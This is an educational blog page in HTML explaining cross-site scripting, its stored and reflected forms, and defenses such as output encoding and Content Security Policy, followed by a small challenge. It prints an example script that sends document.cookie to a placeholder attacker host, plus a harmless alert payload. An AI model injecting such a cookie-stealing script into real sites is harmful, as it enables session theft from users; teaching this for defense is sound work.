<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@400;700;900&family=Montserrat:wght@400;800&family=Orbitron:wght@400;900&family=Kanit:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="Assets/blog_final.css">
</head>
<body>

<div class="container">
   <div class="blog-container">
            <div class="blog-card">
            <img src="Assets/images/ XSS.gif" alt="XSS" class="floating-img">
            <div class="card-text">
               <h2 class="blog-title">XSS</h2>
            <h2>When Your Browser Becomes a Spy</h2>
            <p>In the web ecosystem, we trust our browsers to be the ultimate gatekeepers of our data. However, what if a malicious actor could bypass that trust? This is the dangerous reality of XSS.</p>
            <h3>What is an XSS Vulnerability?</h3>
            <p>XSS is a vulnerability that allows an attacker to "inject" malicious JavaScript code into web pages viewed by other users. Because the browser assumes the code is legitimate, it executes the script as if it were part of the site's design.</p>
            <h3>How Your Browser Becomes a Spy</h3>
            <p>If a site fails to sanitize input, an attacker could submit this code:</p>
            <div class="code-container">
                <pre><code>&lt;script&gt;
  fetch('https://attacker-site.com/steal?cookie=' + document.cookie);
&lt;/script&gt;</code></pre>
            </div>
            <h3>The Two Faces of XSS</h3>
            <ul>
                <li><strong>Stored XSS:</strong> The code is saved in the database. Every user who visits the page becomes a victim.</li>
                <li><strong>Reflected XSS:</strong> The code is sent as part of a link (URL parameter) and reflected back to the user.</li>
            </ul>
            <h3>How to Defend Your Code</h3>
            <p>1. <strong>Output Encoding:</strong> Convert special characters like &lt; and &gt; into literal text.</p>
            <p>2. <strong>Content Security Policy (CSP):</strong> Instruct the browser to execute only authorized scripts from trusted sources.</p>
            <h3>Field Mission (CyberWeave Challenge)</h3>
            <div class="code-container">
                <pre><code>&lt;script&gt;alert('XSS-Found')&lt;/script&gt;</code></pre>
</div>
            </div>
         </div> 
         <div class="comments-section">
            <h3 class="comments-title"><i class="fas fa-comments"></i> Leave a Comment</h3>
            <form action="#" method="POST" class="comment-form">
                <div class="input-group">
                    <input type="text" name="username" placeholder="Your Username" required>
                    <input type="email" name="email" placeholder="Your Email" required>
                </div>
                <textarea name="comment" rows="6" placeholder="Share your comment" required>

                </textarea>
                <button type="submit" class="send-btn">
                    <i class="fas fa-paper-plane"></i> Send
                </button>
            </form>
        </div>

                <nav class="login-buttons">
            <a href="login.html" class="btn-login"><i class="fas fa-user-graduate"></i> Login</a>
            <a href="CreateAccount.html" class="btn-CreateAccount"><i class="fas fa-user-plus"></i> Create Account</a>
        </nav>

    </body>
    </html>